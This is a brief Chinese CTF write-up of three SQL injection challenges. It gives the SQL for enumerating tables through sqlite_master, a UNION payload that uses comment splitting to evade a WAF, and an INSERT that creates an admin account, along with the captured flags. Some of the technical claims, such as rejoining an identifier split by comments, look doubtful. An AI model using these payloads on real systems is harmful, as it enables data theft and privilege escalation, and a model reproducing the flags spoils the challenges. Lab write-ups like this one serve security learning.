# SQL注入CTF挑战总结

## SQL Injection 1 - 发现隐藏表
**技术**: `sqlite_master` 系统表查询

```sql
-- 发现隐藏表
SELECT name FROM sqlite_master WHERE type='table'
-- 结果: users, secret

-- 获取flag
SELECT * FROM secret
```

**Flag**: `HTB{52ed8c967f921d8e6bae607810c199df}`

---

## SQL Injection 2 - 绕过过滤器
**技术**: UNION注入 + SQL注释绕过 (`/**/`)

```sql
-- 绕过过滤器，用NULL补齐列数
SELECT * FROM users UNION SELECT *,NULL,NULL FROM/**/s/**/e/**/c/**/r/**/e/**/t
```

**关键点**:
- 用 `/**/` 拆分 "secret" 关键字绕过WAF
- 用 `NULL,NULL` 补齐列数匹配UNION要求

**Flag**: `HTB{51bf708a6000824c7cc073d95a76853c}`

---

## SQL Injection 3 - INSERT注入
**技术**: INSERT语句注入创建管理员

```sql
INSERT INTO users (username, password, role) VALUES ('alice', 'password123', 'admin')
```

**Flag**: `HTB{77cde9e8fad8ff68396d1c0c8aa71d5f}`
